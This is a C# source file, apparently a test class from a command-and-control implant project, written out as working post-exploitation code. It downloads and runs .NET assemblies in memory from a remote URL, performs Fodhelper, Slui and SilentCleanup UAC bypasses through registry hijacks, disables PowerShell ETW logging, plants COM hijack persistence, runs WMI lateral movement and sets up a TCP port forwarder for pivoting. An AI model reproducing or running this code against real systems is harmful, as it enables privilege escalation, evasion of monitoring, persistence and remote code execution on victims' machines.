using System;
using System.IO;
using System.Text;
using System.Net;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Threading;
using System.Diagnostics;
using System.Management;
using System.Management.Automation;
using System.Text.RegularExpressions;
using System.IO.Compression;
using Microsoft.Win32;

public class TestClass
{
    public TestClass()
    {

    }

    public string filename = Path.GetTempPath() + "implant.txt";
    public string agent = "C:\\Users\\sdavis\\Documents\\GitHub\\LogPincher\\VSProj\\LogPincher\\CSharpAgent\\LogPincherCsharp\\bin\\Debug\\CSharpAgent.exe";
    public string processname = "CSharpAgent";

    public void RunAssembly(string command)
    {
        //Dont@ME; I hate all of this
        command = command.Replace("Execute-Assembly ", "");
        command = command.Replace(" ", "%20");
        //Strip URL
        var linkParser = new Regex(@"\b(?:https?://|www\.)\S+\b", RegexOptions.Compiled | RegexOptions.IgnoreCase);
        string url = linkParser.Match(command).ToString();

        //Convert parameters to assembly arguements
        var argParser = new Regex(@"[\?&](([^&=]+)=([^&=#]*))", RegexOptions.Compiled);
        string args = argParser.Match(url).ToString();
        args = args.Replace("?arg=", "");

        using (WebClient client = new WebClient())
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            using (var ms = new MemoryStream(client.DownloadData(url)))
            using (var br = new BinaryReader(ms))
            using (var fs = new FileStream(filename, FileMode.OpenOrCreate, FileAccess.Write))
            using (var writer = new StreamWriter(fs))
            {
                byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                Assembly a = Assembly.Load(bin);

                //If no parameters, execute
                if (args == "")
                {
                    object[] parameters = new object[1];
                    parameters[0] = new string[] { "" };
                    Console.SetOut(writer);
                    Console.SetError(writer);
                    //Invoke
                    a.EntryPoint.Invoke(null, parameters);
                }

                //Generate parameters object, execute
                else
                {
                    object[] parameters = new object[1];
                    parameters[0] = new string[] { args.Replace("%20", " ") };
                    Console.SetOut(writer);
                    Console.SetError(writer);
                    //Invoke
                    a.EntryPoint.Invoke(null, parameters);
                }
            }
        }
    }

    public string BypassUAC(string command)
    {
        string winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        string system32Directory = Path.Combine(winDir, "system32");
        if (Environment.Is64BitOperatingSystem && !Environment.Is64BitProcess)
        {
            system32Directory = Path.Combine(winDir, "sysnative");
        }

        if (command.Contains("Fodhelper"))
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command", true);
            key.SetValue("", agent, RegistryValueKind.String);
            key.SetValue("DelegateExecute", "", RegistryValueKind.String);

            Thread.Sleep(5000);
            RunCommand("C:\\windows\\system32\\computerdefaults.exe");

            Thread.Sleep(5000);
            Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\shell");

            return "Bypass Executed";
        }

        if (command.Contains("Slui"))
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\exefile\shell\open\command", true);
            key.SetValue("", agent, RegistryValueKind.String);
            key.Close();

            Thread.Sleep(5000);

            RunCommand(Path.Combine(system32Directory, "slui.exe"));

            Thread.Sleep(5000);

            Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\exefile\shell");

            return "Bypass Executed";
        }

        // Up to RS3
        if (command.Contains("Forshaw"))
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Environment", true);
            key.SetValue("windir", agent + " && REM", RegistryValueKind.String);

            Thread.Sleep(5000);

            RunCommand(@"schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I");

            Thread.Sleep(5000);

            key.DeleteValue("windir");
            key.Close();

            return "Bypass Executed";
        }

        return "Failed";
    }

    public string CreatePortForward(string command)
    {
        Regex ips = new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b");
        Regex ports = new Regex(@"\s\d{1,5}\s");
        MatchCollection ipResults = ips.Matches(command);
        MatchCollection portResults = ports.Matches(command);
        string sourceip = ipResults[0].ToString();
        string destip = ipResults[1].ToString();
        string sourceport = portResults[0].ToString();
        string destport = portResults[1].ToString();

        new TcpForwarderSlim().Start(
        new IPEndPoint(IPAddress.Parse(sourceip), int.Parse(sourceport)),
        new IPEndPoint(IPAddress.Parse(destip), int.Parse(destport)));
        return "Created";
    }

    public string DeletePortForward(string command)
    {
        Regex ips = new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b");
        Regex ports = new Regex(@"\s\d{1,5}\s");
        MatchCollection ipResults = ips.Matches(command);
        MatchCollection portResults = ports.Matches(command);
        string sourceip = ipResults[0].ToString();
        string sourceport = portResults[0].ToString();
        if (sourceip == "0.0.0.0")
        {
            IPAddress[] ipv4Addresses = Array.FindAll(Dns.GetHostEntry(string.Empty).AddressList, a => a.AddressFamily == AddressFamily.InterNetwork);
            sourceip = ipv4Addresses[0].ToString();
        }

        Socket delete = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        delete.Connect(new IPEndPoint(IPAddress.Parse(sourceip), int.Parse(sourceport)));
        delete.Send(Encoding.ASCII.GetBytes("DELETEPORTFORWARD"));
        return "Deleted";
    }

    public object RunPowershell(string command) //Based off of SharpSploit. Look in to AMSI bypass research personally
    {
        using (PowerShell ps = PowerShell.Create())
        {
            var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
            if (PSEtwLogProvider != null)
            {
                var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                EtwProvider.SetValue(null, EventProvider);
            }
            ps.AddScript(command);
            var results = ps.Invoke();
            string output = String.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
            ps.Commands.Clear();
            return output;
        }
    }

    public string COMHijack(string command)
    {
        RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + command + "}\\InProcServer32");
        key.SetValue("", agent);
        key.SetValue("ThreadingModel", "Apartment");
        key.SetValue("LoadWithoutCOM", "");

        key = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + command + "}\\ShellFolder");
        key.SetValue("HideOnDesktop", "");
        key.SetValue("Attributes", unchecked((int)0xf090013d), RegistryValueKind.DWord);
        if (key.GetValueNames()[0].Contains("HideOnDesktop"))
        {
            return "Persistence Established on CLSID: " + command;
        }
        else
        {
            return "Persistence Failed";
        }  
    }

    public string RunCommand(string command)
    {
        Process process = new Process();
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.UseShellExecute = false;
        startInfo.Verb = null;
        startInfo.RedirectStandardOutput = true;
        startInfo.FileName = "C:\\windows\\system32\\cmd.exe";
        startInfo.Arguments = "/c " + command;
        process.StartInfo = startInfo;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        return process.StandardOutput.ReadToEnd();
    }
    public string ExfilFile(string command)
    {
        string OGfilename = "test.txt";
        string docxFile = Path.GetTempPath() + "output.docx";
        string directory = "testing";
        string xmlfile = directory + "\\" + "test.xml";

        Directory.CreateDirectory(Path.GetTempPath() + "testing");
        //File.Copy(Path.GetTempPath() + OGfilename, Path.GetTempPath() + xmlfile);
        File.Copy(Path.GetTempPath() + OGfilename, Path.GetTempPath() + "testing\\" + OGfilename);
        ZipFile.CreateFromDirectory(Path.GetTempPath() + directory, docxFile);

        return docxFile;
    }
    public string LateralWMI(string command) // Based on SharpSploit
    {
        string Username = null;
        string Password = null;
        string Command = "ping 127.0.0.1";
        string ComputerName = "127.0.0.1";
        ConnectionOptions options = new ConnectionOptions();
        if ((Username != null && Username != "") && Password != null)
        {
            options.Username = Username;
            options.Password = Password;
        }

        ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", ComputerName), options);

        try
        {
            scope.Connect();
            var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());

            ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");
            PropertyDataCollection properties = inParams.Properties;
            inParams["CommandLine"] = Command;
            ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);
            return "WMI Success";
        }
        catch (Exception e)
        {
            return "WMI Exception:" + e.Message;
        }
    }

    // START TCP FORWARD https://blog.brunogarcia.com/2012/10/simple-tcp-forwarder-in-c.html
    public class TcpForwarderSlim
    {
        private readonly Socket _mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        public void Start(IPEndPoint local, IPEndPoint remote)
        {
            try
            {
                _mainSocket.Bind(local);
                _mainSocket.Listen(10);
            }
            catch (SocketException SE)
            {
                string error = "An error occured while connecting [" + SE.Message + "]\n";
                throw new Exception(error);
            }

            while (true)
            {
                var source = _mainSocket.Accept();
                var destination = new TcpForwarderSlim();
                var state = new State(source, destination._mainSocket);
                destination.Connect(remote, source);
                source.BeginReceive(state.Buffer, 0, state.Buffer.Length, 0, OnDataReceive, state);
            }
        }

        private void Connect(EndPoint remoteEndpoint, Socket destination)
        {
            var state = new State(_mainSocket, destination);
            _mainSocket.Connect(remoteEndpoint);
            _mainSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataReceive, state);
        }

        private static void OnDataReceive(IAsyncResult result)
        {
            var state = (State)result.AsyncState;
            try
            {
                var bytesRead = state.SourceSocket.EndReceive(result);
                if (bytesRead > 0)
                {
                    string hex = BitConverter.ToString(state.Buffer).Replace("-", string.Empty).ToUpper();
                    if (hex.Contains("44454C455445504F5254464F5257415244"))
                    {
                        Process.GetCurrentProcess().Kill();
                    }
                    else
                    {
                        state.DestinationSocket.Send(state.Buffer, bytesRead, SocketFlags.None);
                        state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, 0, OnDataReceive, state);
                    }
                }
            }
            catch
            {
                state.DestinationSocket.Close();
                state.SourceSocket.Close();
            }
        }

        private class State
        {
            public Socket SourceSocket { get; private set; }
            public Socket DestinationSocket { get; private set; }
            public byte[] Buffer { get; private set; }

            public State(Socket source, Socket destination)
            {
                SourceSocket = source;
                DestinationSocket = destination;
                Buffer = new byte[8192];
            }
        }
        //END PORT FORWARD
    }
}